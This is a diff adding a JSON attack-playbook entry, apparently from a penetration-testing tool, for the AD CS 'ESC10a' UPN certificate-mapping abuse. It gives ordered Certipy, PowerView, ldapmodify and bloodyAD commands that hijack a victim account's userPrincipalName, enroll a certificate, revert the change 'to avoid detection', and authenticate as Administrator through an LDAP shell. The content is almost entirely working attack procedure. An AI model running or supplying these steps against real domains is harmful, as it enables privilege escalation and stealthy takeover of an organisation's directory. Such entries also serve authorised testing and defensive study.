@@ -1,0 +1,155 @@
+{
+    "ADCSESC10a": {
+        "meaning": "The principal has control over a victim principal with permission to enroll on one or more certificate templates configured to enable certificate authentication and require the userPrincipalName (UPN) of the enrollee included in the Subject Alternative Name (SAN). There is an affected Domain Controller configured to allow UPN certificate mapping. This allows impersonating any AD forest computer, or any user where UPN does not match their sAMAccountName, by manipulating the victim's UPN before and after certificate enrollment.",
+        "common": "",
+        "windows": {
+            "Certipy_Windows": [
+                {
+                    "order": 1,
+                    "command": "pyinstaller ./Certipy.spec",
+                    "description": "Create Windows executable version of Certipy using PyInstaller"
+                },
+                {
+                    "order": 2,
+                    "command": "Certipy.exe account update -u ATTACKER@CORP.LOCAL -p PWD -user VICTIM -upn Target@CORP.LOCAL",
+                    "description": "Set UPN of victim to targeted principal's sAMAccountName@domain"
+                },
+                {
+                    "order": 3,
+                    "command": "Get-DomainObject -Identity VICTIM -Properties mail",
+                    "description": "Check if victim has mail attribute set (required for some templates)"
+                },
+                {
+                    "order": 4,
+                    "command": "Set-DomainObject -Identity VICTIM -Set @{'mail'='dummy@mail.com'}",
+                    "description": "Set mail attribute if required by certificate template"
+                },
+                {
+                    "order": 5,
+                    "command": "# Obtain session as victim using Shadow Credentials, password reset, or Kerberoasting",
+                    "description": "Obtain credentials or session as victim principal"
+                },
+                {
+                    "order": 6,
+                    "command": "Certipy.exe req -u VICTIM@CORP.LOCAL -p PWD -ca CA-NAME -target CA-SERVER -template TEMPLATE",
+                    "description": "Enroll certificate as victim with manipulated UPN in SAN"
+                },
+                {
+                    "order": 7,
+                    "command": "Certipy.exe account update -u ATTACKER@CORP.LOCAL -p PWD -user VICTIM -upn victim@corp.local",
+                    "description": "Set UPN of victim to arbitrary value after enrollment"
+                },
+                {
+                    "order": 8,
+                    "command": "Certipy.exe auth -pfx TARGET.pfx -dc-ip IP -ldap-shell",
+                    "description": "Perform Schannel authentication as targeted principal using certificate"
+                }
+            ],
+            "PowerView_Certipy": [
+                {
+                    "order": 1,
+                    "command": "Set-DomainObject -Identity VICTIM -Set @{'userprincipalname'='Administrator@domain.com'}",
+                    "description": "Set victim UPN to target user's sAMAccountName@domain via PowerView"
+                },
+                {
+                    "order": 2,
+                    "command": "# Use Shadow Credentials or password reset to obtain victim access",
+                    "description": "Obtain victim credentials through available attack vectors"
+                },
+                {
+                    "order": 3,
+                    "command": "Certipy.exe req -u VICTIM@CORP.LOCAL -p password -ca CA-NAME -target CA-SERVER -template User",
+                    "description": "Enroll certificate with UPN certificate mapping vulnerability"
+                },
+                {
+                    "order": 4,
+                    "command": "Set-DomainObject -Identity VICTIM -Set @{'userprincipalname'='original@domain.com'}",
+                    "description": "Reset victim UPN to avoid detection"
+                },
+                {
+                    "order": 5,
+                    "command": "Certipy.exe auth -pfx Administrator.pfx -dc-ip DC_IP -ldap-shell",
+                    "description": "Authenticate as Administrator using UPN certificate mapping"
+                }
+            ]
+        },
+        "linux": {
+            "Certipy": [
+                {
+                    "order": 1,
+                    "command": "certipy account update -u ATTACKER@CORP.LOCAL -p PWD -user VICTIM -upn Target@CORP.LOCAL",
+                    "description": "Set UPN of victim to targeted principal's sAMAccountName@domain"
+                },
+                {
+                    "order": 2,
+                    "command": "ldapsearch -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME -b \"VICTIM-DN\" mail",
+                    "description": "Check if victim has mail attribute set"
+                },
+                {
+                    "order": 3,
+                    "command": "echo -e \"dn: VICTIM-DN\\nchangetype: modify\\nreplace: mail\\nmail: test@mail.com\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME",
+                    "description": "Set mail attribute if required by certificate template"
+                },
+                {
+                    "order": 4,
+                    "command": "# Obtain victim credentials using Shadow Credentials, password reset, or Kerberoasting",
+                    "description": "Obtain victim credentials through available attack vectors"
+                },
+                {
+                    "order": 5,
+                    "command": "certipy req -u VICTIM@CORP.LOCAL -p PWD -ca CA-NAME -target CA-SERVER -template TEMPLATE",
+                    "description": "Enroll certificate as victim with UPN in SAN"
+                },
+                {
+                    "order": 6,
+                    "command": "certipy account update -u ATTACKER@CORP.LOCAL -p PWD -user VICTIM -upn victim@corp.local",
+                    "description": "Set UPN of victim to arbitrary value after enrollment"
+                },
+                {
+                    "order": 7,
+                    "command": "certipy auth -pfx TARGET.pfx -dc-ip IP -ldap-shell",
+                    "description": "Perform Schannel authentication as targeted principal using certificate"
+                }
+            ],
+            "LDAP_Manual": [
+                {
+                    "order": 1,
+                    "command": "echo -e \"dn: CN=VICTIM,CN=Users,DC=domain,DC=com\\nchangetype: modify\\nreplace: userPrincipalName\\nuserPrincipalName: Administrator@domain.com\" | ldapmodify -x -D 'CN=attacker,CN=Users,DC=domain,DC=com' -w password -h dc.domain.com",
+                    "description": "Set victim UPN to target sAMAccountName@domain via LDAP"
+                },
+                {
+                    "order": 2,
+                    "command": "# Obtain victim credentials and request certificate",
+                    "description": "Get victim access and enroll certificate with UPN in SAN"
+                },
+                {
+                    "order": 3,
+                    "command": "echo -e \"dn: CN=VICTIM,CN=Users,DC=domain,DC=com\\nchangetype: modify\\nreplace: userPrincipalName\\nuserPrincipalName: victim@domain.com\" | ldapmodify -x -D 'CN=attacker,CN=Users,DC=domain,DC=com' -w password -h dc.domain.com",
+                    "description": "Reset victim UPN after certificate enrollment"
+                },
+                {
+                    "order": 4,
+                    "command": "# Use certificate for Schannel authentication with UPN mapping",
+                    "description": "Authenticate as target using UPN certificate mapping"
+                }
+            ],
+            "BloodyAD": [
+                {
+                    "order": 1,
+                    "command": "bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD set object 'CN=VICTIM,CN=Users,DC=domain,DC=com' userPrincipalName 'Administrator@domain.com'",
+                    "description": "Set victim UPN to target sAMAccountName@domain using BloodyAD"
+                },
+                {
+                    "order": 2,
+                    "command": "# Obtain victim session and enroll certificate with UPN mapping vulnerability",
+                    "description": "Use victim credentials to enroll certificate"
+                },
+                {
+                    "order": 3,
+                    "command": "bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD set object 'CN=VICTIM,CN=Users,DC=domain,DC=com' userPrincipalName 'victim@domain.com'",
+                    "description": "Reset victim UPN after certificate enrollment"
+                }
+            ]
+        }
+    }
+}
